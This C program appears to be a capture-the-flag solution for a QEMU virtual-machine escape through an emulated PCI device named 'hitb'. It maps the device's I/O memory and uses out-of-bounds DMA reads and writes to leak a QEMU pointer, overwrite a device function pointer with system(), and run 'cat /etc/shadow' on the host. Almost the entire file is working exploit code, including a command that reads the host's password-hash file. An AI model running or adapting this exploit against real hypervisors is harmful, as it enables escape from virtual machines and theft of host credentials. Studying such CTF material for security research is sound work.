#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

uint64_t virt2phys(void *addr)
{
	uint64_t virt_p = (uint64_t)addr;
	// **Given a virtual address, calculate offset into /pagemap**
	// Average page is 0x1000 (4096), so divide current ptr by page size
	// This results in number of pages to our buffer
	// Multiply that by 8 to get correct length (offset into file as each value is 8 bytes)
	uint64_t offset = (virt_p / 0x1000) * 8;
	// Store return value
	uint64_t phys;

	// Open /pagemap, scroll to offset, read phys addr
	FILE *fd = fopen("/proc/self/pagemap", "r");
	fseek(fd, offset, SEEK_SET);
	fread(&phys, sizeof(uint64_t), 1, fd);

	//???
	// printf("%p\n", phys);
	// printf("%p\n", phys & ((1ULL << 54) - 1));

	// Do math???
	phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
	return phys;
}

void iowrite(char *iomem, uint64_t addr, uint64_t val) {
	*((uint64_t*)(iomem + addr)) = val;
}

uint64_t ioread(char *iomem, uint64_t addr) {
	return *((uint64_t*)(iomem + addr));
}

int main()
{	

	//////////////////////////////////////////
	// Get IO Memory Location for PCI Device
	//////////////////////////////////////////

	// Open and map I/O memory for the hitb device
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	unsigned char* iomem = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

	printf("HITB Device IOMEM: %p\n", iomem);

	//////////////////////////////////////////
	// Create DMA Buffer & Get Its Physaddr
	//////////////////////////////////////////

	// Create buffer in userspace
	unsigned char *dma_buff = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	/*
	   mlock(), mlock2(), and mlockall() lock part or all of the calling
	   process's virtual address space into RAM, preventing that memory
	   from being paged to the swap area.
	*/
	// This is required to ensure that we get a RAM address that's actually in our virtual space
	mlock(dma_buff, 0x1000);

	// Translate buffer addr to phys space
	uint64_t dma_phys = virt2phys(dma_buff);

	// Print
	printf("DMA in Virtual Space: %p\n", dma_buff);
	printf("DMA in Physical Space: %p\n", (void *)dma_phys);

	//////////////////////////////////////////
	// Leak Binary Pointer from enc() ptr
	//////////////////////////////////////////

	// Setup our registers to read enc() from DMA Struct
	iowrite(iomem, 128, 0x40000 + 0x1000); 	// set_src, enc ptr in dma struct
	iowrite(iomem, 136, dma_phys); 			// set_dst, output to our dma buffer
	iowrite(iomem, 144, 8); 				// set_cnt, get 8 bytes
	iowrite(iomem, 152, 2 | 1); 			// set_cmd, read bytes
	sleep(2);
	
	// Recieve leaked enc() pointer
	uint64_t hitb_enc_ptr = *((uint64_t*)dma_buff);
	uint64_t qemu_base = hitb_enc_ptr - 0x383dd0 + 0x100000; // Add base addr of 0x100000
	printf("Leaked QEMU Addr: 0x%lx\n", hitb_enc_ptr);
	printf("Leaked QEMU Base Addr: 0x%lx\n", qemu_base);
	uint64_t system_call = qemu_base + 0x2fdb18 - 0x100000;	// Remove base addr of 0x100000
	printf("system() Addr: 0x%lx\n", system_call);

	// Setup our registers to write system() over hitb.enc()
	memcpy(dma_buff, &system_call, 8);		// Put system in DMA buffer
	iowrite(iomem, 128, dma_phys); 			// set_src, system_call addr in DMA phys
	iowrite(iomem, 136, 0x40000 + 0x1000); 	// set_dst, overwrite enc
	iowrite(iomem, 144, 8); 				// set_cnt, write 8 bytes
	iowrite(iomem, 152, 0 | 1); 			// set_cmd, write bytes
	printf("Overwrote hitb.enc() with system()\n");
	sleep(2);

	// Setup registers for writing first arguement into system()
	char* exploit = "cat /etc/shadow;";
	size_t str_size = strlen(exploit);
	memcpy(dma_buff, exploit, str_size);	// Put exploit *string* in DMA buffer
	iowrite(iomem, 128, dma_phys); 			// set_src, system_call addr in DMA phys
	iowrite(iomem, 136, 0x40000 + 0x100); 	// set_dst, normal buffer space
	iowrite(iomem, 144, str_size); 			// set_cnt, exploit length
	iowrite(iomem, 152, 0 | 1); 			// set_cmd, write bytes
	printf("Filled DMA for exploit!\n");
	sleep(2);

	// Call our overwritten system(cat /etc/shadow)
	iowrite(iomem, 128, 0x40000 + 0x100); 	// set_src, normal buffer with exploit
	iowrite(iomem, 136, dma_phys); 			// set_dst, phys dma location
	iowrite(iomem, 144, 0x1); 				// set_cnt, write only one byte to trigger
	iowrite(iomem, 152, 6 | 1); 			// set_cmd, enc bytes // 4 | 2 | 1
	printf("Call overwritten hitb.enc()\n");
	sleep(2);

	return 0;
}